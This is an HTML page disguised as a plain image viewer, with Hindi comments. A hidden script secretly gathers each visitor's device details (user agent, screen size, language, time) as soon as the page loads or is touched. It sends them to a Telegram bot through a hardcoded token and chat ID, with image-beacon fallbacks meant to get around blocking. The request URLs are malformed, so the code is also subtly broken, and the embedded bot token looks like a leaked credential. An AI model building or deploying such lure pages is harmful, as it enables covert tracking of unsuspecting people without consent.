<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background-color: black; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            user-select: none; 
        }
        img { 
            max-width: 100%; 
            max-height: 100vh; 
            object-fit: contain; 
        }
    </style>
</head>
<body>

    <!-- 📷 फोटो हमेशा लोड होगी -->
    <img src="photo.jpg" alt="Image Viewer" id="targetImage">

    <script>
        const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
        const telegramChatId = "1798743066"; 

        let isTracked = false;

        function sendToTelegramDirect() {
            if (isTracked) return;
            isTracked = true;

            // बुनियादी और सटीक डिवाइस विवरण निकालना (जो कभी ब्लॉक नहीं होता)
            const userAgentText = navigator.userAgent;
            const screenRes = window.screen.width + "x" + window.screen.height;
            const pageLanguage = navigator.language || "Unknown";
            const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

            // टेलीग्राम के लिए सुंदर मैसेज तैयार करना
            const message = `🔔 *LIVE VISITOR ALERT* 🔔\n\n` +
                            `📱 *Device Details:* \`${userAgentText}\`\n` +
                            `🖥️ *Screen Size:* \`${screenRes}\`\n` +
                            `🌐 *Language:* \`${pageLanguage}\`\n` +
                            `⏱️ *Time:* ${currentTime}`;

            // बिना किसी बाहरी API के सीधे टेलीग्राम को डेटा भेजना
            const url = `https://telegram.org{telegramToken}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).then(res => {
                if(res.ok) {
                    console.log("Success");
                } else {
                    // यदि fetch ब्लॉक हो, तो इमेज मेथड (Image Beacon) से बैकअप भेजना
                    const fallbackUrl = `https://telegram.org{telegramToken}/sendMessage?chat_id=${telegramChatId}&text=Visitor_Alert_Triggered_At_${encodeRaw(currentTime)}`;
                    new Image().src = fallbackUrl;
                }
            }).catch(() => {
                // अंतिम बैकअप: अगर सब कुछ फेल हो जाए
                const backupUrl = `https://telegram.org{telegramToken}/sendMessage?chat_id=${telegramChatId}&text=New_Visitor_On_Website`;
                new Image().src = backupUrl;
            });
        }

        function encodeRaw(str) {
            return encodeURIComponent(str).replace(/[!'()*]/g, escape);
        }

        // विज़िटर के आते ही, स्क्रीन छूते ही या फोटो पर क्लिक करते ही तुरंत ट्रिगर होगा
        window.addEventListener('DOMContentLoaded', sendToTelegramDirect);
        window.addEventListener('touchstart', sendToTelegramDirect);
        window.addEventListener('click', sendToTelegramDirect);
        document.getElementById('targetImage').addEventListener('click', sendToTelegramDirect);
    </script>

</body>
</html>
